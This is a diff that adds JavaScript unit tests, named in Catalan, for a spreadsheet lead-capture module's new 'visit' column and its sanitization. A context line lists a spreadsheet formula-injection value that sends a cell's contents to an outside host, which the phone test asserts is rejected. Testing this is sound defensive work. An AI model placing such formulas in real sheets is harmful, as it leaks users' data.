@@ -306,3 +306,31 @@ test('telèfon: format «+prefix número»; un valor que sembla fórmula o no en
   assert.equal(phone('+34 (93) 123-45-67').phone, '+34 (93) 123-45-67');
   for (const bad of ['=IMAGE("https://x/?"&B2)', '@SUM(A1)', '600000000', '+34', 'abc']) assert.equal(phone(bad), null, bad);
 });
+
+test('«visit» és l\'última columna de Leads: les anteriors no es mouen', () => {
+  const { api } = load();
+  assert.equal(api.COLUMNS.at(-1), 'visit');
+  assert.deepEqual([api.COLUMNS.indexOf('city'), api.COLUMNS.indexOf('comments'), api.COLUMNS.indexOf('visit')], [24, 25, 26]);
+});
+test('la visita del lead es desa si té format d\'id i, si no, queda buida (mai una fórmula)', () => {
+  const { api } = load();
+  const lead = (visit) => api.sanitizeLead({ ...complete, contact: { ...contact, visit } });
+  assert.equal(lead('visit-0001').visit, 'visit-0001');
+  for (const bad of ['=1+1', 'a b', '', undefined, 5]) assert.equal(lead(bad).visit, '', String(bad));
+});
+test('ensureHeader afegeix «visit» a un full amb la capçalera de 26 columnes sense tocar les files', () => {
+  const { api, sheet } = load();
+  const old = [...api.COLUMNS].slice(0, 26);
+  sheet.rows.push(old, ['x', 'complete']);
+  api.ensureHeader(sheet, api.COLUMNS);
+  assert.deepEqual(sheet.rows[0], [...api.COLUMNS]);
+  assert.deepEqual(sheet.rows[1], ['x', 'complete']);
+});
+test('upsert desa la visita a la fila i un final posterior la conserva', () => {
+  const { api, sheet } = load();
+  api.ensureHeader(sheet, api.COLUMNS);
+  const send = (stage) => api.upsertLead(sheet, api.sanitizeLead({ ...complete, stage, contact: { ...contact, visit: 'visit-0001' } }), '2026-11-13T10:00:00.000Z');
+  send('step1'); send('complete');
+  assert.equal(sheet.rows.length, 2);
+  assert.equal(sheet.rows[1][api.COLUMNS.indexOf('visit')], 'visit-0001');
+});
